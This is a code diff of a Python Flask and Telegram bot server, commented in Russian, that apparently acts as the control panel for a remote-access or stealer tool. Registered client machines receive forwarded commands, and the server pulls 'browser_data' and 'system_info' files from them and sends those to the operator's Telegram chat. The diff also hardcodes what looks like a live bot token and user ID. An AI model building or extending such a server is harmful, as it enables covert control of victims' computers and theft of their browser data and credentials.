@@ -3,6 +3,7 @@ import logging
 import requests
 import threading
 import time
+import asyncio
 from flask import Flask, request, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
@@ -16,10 +17,13 @@ from telegram.ext import (
 
 app = Flask(__name__)
 
-# Конфигурация
-BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN")
-AUTHORIZED_USERS = [int(x) for x in os.getenv("AUTHORIZED_USERS", "").split(",")]
-SERVER_URL = os.getenv("RENDER_EXTERNAL_URL", "https://your-app-name.onrender.com")
+# ===== КОНФИГУРАЦИЯ (ЗАМЕНИТЕ ЭТИ ЗНАЧЕНИЯ!) =====
+BOT_TOKEN = "8004274832:AAG2gDVDp_dQLllcVBIYVB-0WTJ1Ts4CtCU"  # Например: "6123456789:AAFm0x4JxE0v5JwZz0XxXxXxXxXxXxXxXxXx"
+AUTHORIZED_USERS = [6330090175]  # Например: 123456789
+SERVER_URL = "https://mypc-wk16.onrender.com"  # Например: "https://my-remote-bot.onrender.com"
+PORT = 10000
+# ================================================
+
 CLIENTS = {}
 BROWSER_DATA_CACHE = {}
 SYSTEM_INFO_CACHE = {}
@@ -30,6 +34,21 @@ logging.basicConfig(
     level=logging.INFO
 )
 
+# Инициализация приложения бота
+bot_app = Application.builder().token(BOT_TOKEN).build()
+
+# Очистка неактивных клиентов
+def cleanup_clients():
+    while True:
+        time.sleep(300)
+        now = time.time()
+        inactive = [cid for cid, cdata in CLIENTS.items() if now - cdata['last_seen'] > 1800]
+        
+        for client_id in inactive:
+            del CLIENTS[client_id]
+            logging.info(f"Removed inactive client: {client_id}")
+
+# Регистрация клиента
 @app.route('/register', methods=['POST'])
 def register_client():
     data = request.json
@@ -68,6 +87,7 @@ def register_client():
     
     return jsonify({"status": "success"})
 
+# Проксирование команд клиенту
 @app.route('/client/<client_id>/<command>', methods=['GET', 'POST'])
 def client_command(client_id, command):
     if client_id not in CLIENTS:
@@ -93,18 +113,7 @@ def client_command(client_id, command):
         logging.error(f"Forward error: {e}")
         return jsonify({"error": str(e)}), 500
 
-def cleanup_clients():
-    """Очистка неактивных клиентов"""
-    while True:
-        time.sleep(300)
-        now = time.time()
-        inactive = [cid for cid, cdata in CLIENTS.items() if now - cdata['last_seen'] > 1800]
-        
-        for client_id in inactive:
-            del CLIENTS[client_id]
-            logging.info(f"Removed inactive client: {client_id}")
-
-# Telegram Bot
+# Telegram Bot Handlers
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id not in AUTHORIZED_USERS:
@@ -215,7 +224,8 @@ async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await query.edit_message_text(report)
                 await context.bot.send_document(
                     chat_id=query.message.chat_id,
-                    document=open(f"browser_data_{client_id}.json", "rb")
+                    document=open(f"browser_data_{client_id}.json", "rb"),
+                    filename=f"browser_data_{client_id}.json"
                 )
             elif command == "system_info":
                 data = response.json()
@@ -235,7 +245,8 @@ async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await query.edit_message_text(report)
                 await context.bot.send_document(
                     chat_id=query.message.chat_id,
-                    document=open(f"system_info_{client_id}.json", "rb")
+                    document=open(f"system_info_{client_id}.json", "rb"),
+                    filename=f"system_info_{client_id}.json"
                 )
             else:
                 await query.edit_message_text(f"✅ Команда выполнена на {CLIENTS[client_id]['name']}")
@@ -300,20 +311,44 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     # Сбрасываем состояние
     context.user_data.pop('last_command', None)
 
-def run_bot():
-    bot_app = Application.builder().token(BOT_TOKEN).build()
+# Регистрация обработчиков
+def register_handlers():
     bot_app.add_handler(CommandHandler("start", start))
     bot_app.add_handler(CallbackQueryHandler(handle_selection))
     bot_app.add_handler(CallbackQueryHandler(handle_command))
     bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-    bot_app.run_polling()
+
+# Веб-хук обработчик
+@app.post(f'/{BOT_TOKEN}')
+async def webhook():
+    json_data = request.get_json()
+    update = Update.de_json(json_data, bot_app.bot)
+    await bot_app.process_update(update)
+    return '', 200
+
+# Установка веб-хука при запуске
+async def set_webhook():
+    await bot_app.bot.set_webhook(f"{SERVER_URL}/{BOT_TOKEN}")
+
+def run_bot():
+    register_handlers()
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    loop.run_until_complete(set_webhook())
+    logging.info(f"Webhook установлен: {SERVER_URL}/{BOT_TOKEN}")
+
+@app.route('/')
+def index():
+    return "Сервер запущен. Ожидание команд."
 
 if __name__ == "__main__":
+    logging.info("Сервер запускается...")
+    
     # Запуск очистки неактивных клиентов
     threading.Thread(target=cleanup_clients, daemon=True).start()
     
-    # Запуск бота в отдельном потоке
-    threading.Thread(target=run_bot, daemon=True).start()
+    # Запуск бота
+    run_bot()
     
     # Запуск Flask сервера
-    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
+    app.run(host='0.0.0.0', port=PORT)
